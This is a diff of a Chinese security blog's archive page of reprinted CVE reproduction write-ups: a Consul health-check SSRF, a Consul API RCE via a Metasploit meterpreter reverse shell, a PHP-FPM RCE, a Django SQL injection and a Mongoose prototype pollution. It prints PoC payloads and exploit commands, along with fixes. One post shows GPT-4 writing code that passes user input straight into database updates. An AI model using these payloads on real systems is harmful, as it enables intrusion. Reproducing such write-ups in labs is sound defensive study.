+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Proxy/" rel="tag">Proxy</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/V2ray/" rel="tag">V2ray</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/29/CVE-2022-29153-Consul/">
+                CVE-2022-29153 consul SSRF
+            </a>
+        </h2>
+    
+    <time>
+        Jan 29, 2024
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-29153-consul-ssrf">CVE-2022-29153 consul SSRF</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://github.com/cokeBeer/go-cves/blob/main/CVE-2022-29153/CVE-2022-29153.md">cokeBeer</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞信息">漏洞信息</span></h2><blockquote>
+<ul>
+<li>漏洞类型：SSRF</li>
+<li>漏洞版本：&lt; 1.9.17，&gt;&#x3D; 1.10.0, &lt; 1.10.10，&gt;&#x3D; 1.11.0, &lt; 1.11.5</li>
+<li>漏洞简介：http类型的health_check被重定向导致的SSRF</li>
+</ul>
+</blockquote>
+<h2><span id="repo介绍">repo介绍</span></h2><blockquote>
+<p>consul是一个用go语言编写的分布式应用管理服务器，目前在github上已经有24.7k个star</p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>consul提供了对于服务的health_check能力。首先安装一个漏洞版本的consul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -</span><br><span class="line">sudo apt-add-repository <span class="string">&quot;deb [arch=amd64] https://apt.releases.hashicorp.com <span class="subst">$(lsb_release -cs)</span> main&quot;</span></span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install consul=1.10.9</span><br></pre></td></tr></table></figure>
+
+<p>然后启动一个consul服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consul agent -dev -enable-script-checks -node=web -ui</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://localhost:8500/</code>可以看到consul的界面</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/1.png" alt="image"></p>
+<p>编写一个<code>ssrf.json</code>作为poc，里面标志的http地址会将请求302重定向到<code>127.0.0.1:80</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;ID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">5001</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;check&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;checkid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf_check&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Check ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://fuzz.red/ssrf/127.0.0.1/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;interval&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10s&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1s&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用如下指令将<code>health_check</code>注册到consul服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --request PUT --data @ssrf.json http://127.0.0.1:8500/v1/agent/service/register</span><br></pre></td></tr></table></figure>
+
+<p>可以看到添加成功</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/2.png" alt="image"></p>
+<p>这时consul会主动运行<code>health_check</code>，请求被302重定向到内网，导致了SSRF。可以看到nc也收到了请求</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方式">修复方式</span></h2><blockquote>
+<p>在<a target="_blank" rel="noopener" href="https://github.com/hashicorp/consul/blob/928fefd2a7ee5ae8d90377514ec2022ee9730be0/agent/config/config.go#L391">agent&#x2F;config.go</a>中添<code>加DisableRedirects</code>字段，可以在服务器端配置，关闭<code>health_check</code>的重定向</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-q6h7-4qgw-2j9p">https://github.com/advisories/GHSA-q6h7-4qgw-2j9p</a></li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Consul/" rel="tag">Consul</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/29/Consul-API-RCE/">
+                Hashicorp Consul Service API远程命令执行漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Jan 29, 2024
+    </time>
+    <section class="content">
+        <h1><span id="hashicorp-consul-service-api远程命令执行漏洞">Hashicorp Consul Service API远程命令执行漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/Hashicorp_Consul_Service_API_RCE.html">starnight_cyber</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>Consul是HashiCorp公司推出的一款开源工具，用于实现分布式系统的服务发现与配置。与其他分布式服务注册与发现的方案相比，Consul提供的方案更为“一站式”。Consul内置了服务注册与发现框架、分布一致性协议实现、健康检查、Key&#x2F;Value存储、多数据中心方案，不再需要依赖其他工具（例如ZooKeeper等），使用方式也相对简单。</p>
+<p>Consul使用Go语言编写，因此具有天然的可移植性（支持Linux、Windows和Mac OS X系统）；且安装包中仅包含一个可执行文件，便于部署，可与Docker等轻量级容器无缝配合。</p>
+<p>在特定配置下，恶意攻击者可以通过发送精心构造的HTTP请求在未经授权的情况下在Consul服务端远程执行命令。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>从 <a target="_blank" rel="noopener" href="https://releases.hashicorp.com/consul/1.2.4/">https://releases.hashicorp.com/consul/1.2.4/</a> 下载相应 Linux 版本，直接启动服务即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./consul agent -dev -client your-serv-ip -enable-script-checks</span><br></pre></td></tr></table></figure>
+
+<p>访问：<a target="_blank" rel="noopener" href="http://148.153.199.229:8500/v1/agent/self">http://your-serv-ip:8500/v1/agent/self</a></p>
+<p>启用了 <strong>EnableRemoteScriptChecks: true</strong> </p>
+<p><img src="/2024/01/29/Consul-API-RCE/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞验证">漏洞验证</span></h2><blockquote>
+<ol>
+<li>使用 MSF 进行测试，简要过程如下：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search Hashicorp</span><br><span class="line"> </span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"> </span><br><span class="line">   <span class="comment">#  Name                                    Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                    ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/misc/nomad_exec           2021-05-17       excellent  Yes    HashiCorp Nomad Remote Command Execution</span><br><span class="line">   1  exploit/multi/misc/consul_rexec_exec    2018-08-11       excellent  Yes    Hashicorp Consul Remote Command Execution via Rexec</span><br><span class="line">   2  exploit/multi/misc/consul_service_exec  2018-08-11       excellent  Yes    Hashicorp Consul Remote Command Execution via Services API</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/misc/consul_service_exec</span><br><span class="line"> </span><br><span class="line">msf6 &gt; use 2</span><br><span class="line">[*] Using configured payload linux/x86/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功创建 meterpreter。</p>
+<p><img src="/2024/01/29/Consul-API-RCE/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复措施">修复措施</span></h2><blockquote>
+<ol>
+<li>禁用Consul服务器上的脚本检查功能</li>
+<li>确保Consul HTTP API服务无法通过外网访问或调用</li>
+<li>对&#x2F;v1&#x2F;agent&#x2F;service&#x2F;register 禁止PUT方法</li>
+</ol>
+</blockquote>
+<h2><span id="参考">参考</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/115870000">https://blog.csdn.net/qq_44159028/article/details/115870000</a></p>
+<p><a target="_blank" rel="noopener" href="https://releases.hashicorp.com/consul/1.2.4/">https://releases.hashicorp.com/consul/1.2.4/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960">https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960</a></p>
+<p>以上！</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Consul/" rel="tag">Consul</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/25/Firebase-Installations-Server-API/">
                 与 Firebase 安装服务器 API 通信时的 Android 错误
             </a>
@@ -327,764 +1087,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Signature/" rel="tag">Signature</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/25/CVE-2019-11043-Nginx/">
-                CVE-2019-11043漏洞分析与复现
-            </a>
-        </h2>
-    
-    <time>
-        Jan 25, 2024
-    </time>
-    <section class="content">
-        <h1><span id="cve-2019-11043漏洞分析与复现">CVE-2019-11043漏洞分析与复现</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/st66/p/14735800.html">STong66</a> 并作补充</p>
-</blockquote>
-<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
-<p>Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO</p>
-<p>为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。</p>
-<p>该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.<span class="title function_ invoke__">php</span>(/|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
-</blockquote>
-<h3><span id="漏洞类型">漏洞类型</span></h3><blockquote>
-<p>远程代码执行漏洞</p>
-</blockquote>
-<h3><span id="危险等级">危险等级</span></h3><blockquote>
-<p>高危</p>
-</blockquote>
-<h3><span id="利用条件">利用条件</span></h3><blockquote>
-<p>nginx配置了fastcgi_split_path_info</p>
-</blockquote>
-<h3><span id="受影响系统">受影响系统</span></h3><blockquote>
-<p>PHP 5.6-7.x，Nginx&gt;&#x3D;0.7.31</p>
-</blockquote>
-<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
-<p>使用某个大佬的 docker 环境进行复现：</p>
-<p>PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
-</blockquote>
-<h3><span id="准备工作安装-docker-golang-环境">准备工作：安装 docker、golang 环境</span></h3><blockquote>
-<p>在kali中使用如下命令安装docker和golang：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker docker-compose</span><br><span class="line">sudo apt install golang</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/1.png" alt="image"></p>
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/2.png" alt="image"></p>
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="搭建漏洞环境">搭建漏洞环境</span></h3><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/php/CVE-2019-11043 &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/4.png" alt="image"></p>
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/5.png" alt="image"></p>
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/6.png" alt="image"></p>
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/7.png" alt="image"></p>
-</blockquote>
-<h3><span id="安装漏洞利用工具">安装漏洞利用工具</span></h3><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"><span class="built_in">cd</span> phuip-fpizdam</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/8.png" alt="image"></p>
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/9.png" alt="image"></p>
-</blockquote>
-<h3><span id="漏洞利用">漏洞利用</span></h3><blockquote>
-<p><strong>在phuip-fpizdam目录下执行 go run . “<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/index.php&quot;%E5%90%8E%E6%88%90%E5%8A%9F%E6%98%BE%E7%A4%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F%E3%80%82">http://127.0.0.1:8080/index.php&quot;后成功显示漏洞利用成功。</a></strong></p>
-<p><strong>在浏览器进行了如下请求，成功复现，可以执行系统命令,id可以替换为其他OS命令。</strong></p>
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/10.png" alt="image"></p>
-</blockquote>
-<h3><span id="漏洞分析">漏洞分析</span></h3><blockquote>
-<p>具体漏洞信息可参考：<a target="_blank" rel="noopener" href="https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227">https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a/#diff-624bdd47ab6847d777e15327976a9227</a></p>
-<p>有漏洞信息可知漏洞是由于path_info 的地址可控导致的，我们可以看到，当path_info 被%0a截断时，path_info 将被置为空，回到代码中我就发现问题所在了。</p>
-<p>如下漏洞代码</p>
-<p><img src="/2024/01/25/CVE-2019-11043-Nginx/11.png" alt="image"></p>
-<p>在代码的1134行我们发现了可控的 path_info 的指针env_path_info</p>
-<p>其中</p>
-<p>env_path_info 就是变量path_info 的地址，path_info 为0则plien 为0。</p>
-<p>slen 变量来自于请求后url的长度 int ptlen &#x3D; strlen(pt); int slen &#x3D; len - ptlen;</p>
-<p>由于<code>apache_was_here</code>这个变量在前面被设为了0，因此path_info的赋值语句实际上就是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_info = env_path_info ? env_path_info + pilen - slen : NULL;</span><br></pre></td></tr></table></figure>
-
-<p>env_path_info是从Fast CGI的PATH_INFO取过来的，而由于代入了<code>%0a</code>，在采取<code>fastcgi_split_path_info ^(.+?\.php)(/.*)$;</code>这样的Nginx配置项的情况下，fastcgi_split_path_info无法正确识别现</p>
-<p>在的url，因此会Path Info置空，所以env_path_info在进行取值时，同样会取到空值，这也正是漏洞原因所在。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/25/CVE-2022-28346-Django/">
-                Django SQL注入漏洞 (CVE-2022-28346)
-            </a>
-        </h2>
-    
-    <time>
-        Jan 25, 2024
-    </time>
-    <section class="content">
-        <h1><span id="django-sql注入漏洞-cve-2022-28346">Django SQL注入漏洞 (CVE-2022-28346)</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/128496498">李火火安全阁</a> 并作补充</p>
-</blockquote>
-<h2><span id="一-简介">一、简介</span></h2><blockquote>
-<p>Django是用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Python%E5%BC%80%E5%8F%91&spm=1001.2101.3001.7020">Python开发</a>的一个免费开源的Web结构，几乎包括了Web使用方方面面，能够用于快速建立高性能、文雅的网站，Diango提供了许多网站后台开发常常用到的模块，使开发者可以专注于业务部分。</p>
-</blockquote>
-<h2><span id="二-漏洞概述">二、漏洞概述</span></h2><blockquote>
-<p>漏洞编号：CVE-2022-28346</p>
-<p>攻击者使用精心编制的字典，通过 **kwargs 传递给QuerySet.annotate()、aggregate()和extra()这些方法，可导致这些方法在列别名中受到SQL注入攻击，该漏洞在 2.2.28 之前的 Django 2.2、3.2.13 之前的 3.2 和 4.0.4 之前的 4.0 中都存在这个问题。</p>
-</blockquote>
-<h2><span id="三-漏洞影响版本">三、漏洞影响版本</span></h2><blockquote>
-<ul>
-<li>4.0 &lt;&#x3D; Django &lt; 4.0.4</li>
-<li>3.2 &lt;&#x3D; Django &lt; 3.2.13</li>
-<li>2.2 &lt;&#x3D; Django &lt; 2.2.28</li>
-</ul>
-</blockquote>
-<h2><span id="四-漏洞分析">四、漏洞分析</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/962127.html">http://cn-sec.com/archives/962127.html</a></p>
-</blockquote>
-<h2><span id="五-漏洞复现">五、漏洞复现</span></h2><h3><span id="docker">Docker</span></h3><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull s0cke3t/cve-2022-28346:latest</span><br><span class="line">docker run -d -p 8080:8000 s0cke3t/cve-2022-28346</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="本地环境搭建">本地环境搭建</span></h3><blockquote>
-<p>环境下载：<code>https://github.com/DeEpinGh0st/CVE-2022-28346</code></p>
-<p>Python：3.9.8<br>Django：3.2.11</p>
-</blockquote>
-<h3><span id="本地启动">本地启动</span></h3><blockquote>
-<p>环境初始化</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br><span class="line">访问http://x.x.x.x:8000/ 插入初始化数据</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/25/CVE-2022-28346-Django/1.png" alt="image"></p>
-<p>浏览器访问</p>
-<p><img src="/2024/01/25/CVE-2022-28346-Django/2.png" alt="image"></p>
-<p>访问404可以获取到报错页面查看报错信息得到传参接口(注入点接口)</p>
-<p><img src="/2024/01/25/CVE-2022-28346-Django/3.png" alt="image"></p>
-<p>访问到demo&#x2F; 目录下，同样会出现报错信息</p>
-<p><img src="/2024/01/25/CVE-2022-28346-Django/4.png" alt="image"></p>
-<p>利用报错中提示的参数进行SQL注入<br>POC：<code>http://x.x.x.x:8000/demo?field=demo.name&quot; FROM &quot;demo_user&quot; union SELECT &quot;1&quot;,sqlite_version(),&quot;3&quot; –</code></p>
-<p><img src="/2024/01/25/CVE-2022-28346-Django/5.png" alt="image"></p>
-</blockquote>
-<h2><span id="六-修复方法">六、修复方法</span></h2><blockquote>
-<p>官方已发布安全版本<br>下载地址：<a target="_blank" rel="noopener" href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Django/" rel="tag">Django</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SQL-Injection/" rel="tag">SQL Injection</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2024/01/23/CVE-2023-3696-Mongoose/">
-                Mongoose Prototype Pollution Vulnerability in automattic/mongoose(CVE-2023-3696)
-            </a>
-        </h2>
-    
-    <time>
-        Jan 23, 2024
-    </time>
-    <section class="content">
-        <h1><span id="mongoose-prototype-pollution-vulnerability-in-automatticx2fmongoosecve-2023-3696">Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose(CVE-2023-3696)</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://huntr.com/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/">ehhthing</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>If an attacker has some way to control an object on the Mongo server through one way or another, it is possible to cause prototype pollution on any Mongoose client. Notably, if a poorly implemented service allows a user to control the object in <code>findByIdAndUpdate</code> and similar functions, this bug could be triggered through the <code>$rename</code> operator. Another possibility is if two different services interact with the same Mongo database, it is possible that one of them allows a user to inject an arbitrary object containing a <code>__proto__</code> field, which would also trigger this bug.</p>
-<p>If used with Express and EJS, this bug can easily lead to RCE. Many other libraries have known prototype pollution exploits as well, which may cause significant impact.</p>
-<p>Allowing user input directly into <code>update</code> operations seems to be a very common pattern. For example, if we ask GPT-4 a basic prompt for updating a post using Mongoose, it gives us:</p>
-</blockquote>
-<h3><span id="prompt">Prompt:</span></h3><blockquote>
-<p>Using Express and Mongoose, take input from the user to find a “Post” by an id, and update its fields.</p>
-</blockquote>
-<h3><span id="response">Response:</span></h3><blockquote>
-<p>In Express and Mongoose, you can use the <code>findByIdAndUpdate</code> method to find a “Post” by an id and update its fields. Here’s how you can do it:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const mongoose = require(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line">const Post = require(<span class="string">&#x27;./models/post&#x27;</span>); // Assuming you have a Post model <span class="keyword">in</span> models/post.js</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(express.json()); // <span class="keyword">for</span> parsing application/json</span><br><span class="line"></span><br><span class="line">app.put(<span class="string">&#x27;/post/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    const &#123; <span class="built_in">id</span> &#125; = req.params;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        const post = <span class="keyword">await</span> Post.findByIdAndUpdate(<span class="built_in">id</span>, req.body, &#123; new: true &#125;); </span><br><span class="line">        // new: true returns the updated post rather than the original post when the operation began</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!post) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.status(<span class="number">404</span>).send();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.send(post);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        res.status(<span class="number">400</span>).send(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>In the above example, <code>req.params.id</code> is used to get the id from the URL. The <code>req.body</code> is used to get the updated data from the user. The <code>&#123; new: true &#125;</code> option is used to return the updated post.</p>
-</blockquote>
-<h2><span id="proof-of-concept">Proof of concept:</span></h2><blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; connect, model, Schema &#125; <span class="keyword">from</span> <span class="string">&#x27;mongoose&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> connect(<span class="string">&#x27;mongodb://127.0.0.1:27017/exploit&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const Example = model(<span class="string">&#x27;Example&#x27;</span>, new Schema(&#123; hello: String &#125;));</span><br><span class="line"></span><br><span class="line">const example = <span class="keyword">await</span> new Example(&#123; hello: <span class="string">&#x27;world!&#x27;</span> &#125;).save();</span><br><span class="line"><span class="keyword">await</span> Example.findByIdAndUpdate(example._<span class="built_in">id</span>, &#123;</span><br><span class="line">    $rename: &#123;</span><br><span class="line">        hello: <span class="string">&#x27;__proto__.polluted&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// this <span class="keyword">is</span> what causes the pollution</span><br><span class="line"><span class="keyword">await</span> Example.find();</span><br><span class="line"></span><br><span class="line">const test = &#123;&#125;;</span><br><span class="line">console.log(test.polluted); // world!</span><br><span class="line">console.log(Object.prototype); // [Object: null prototype] &#123; polluted: <span 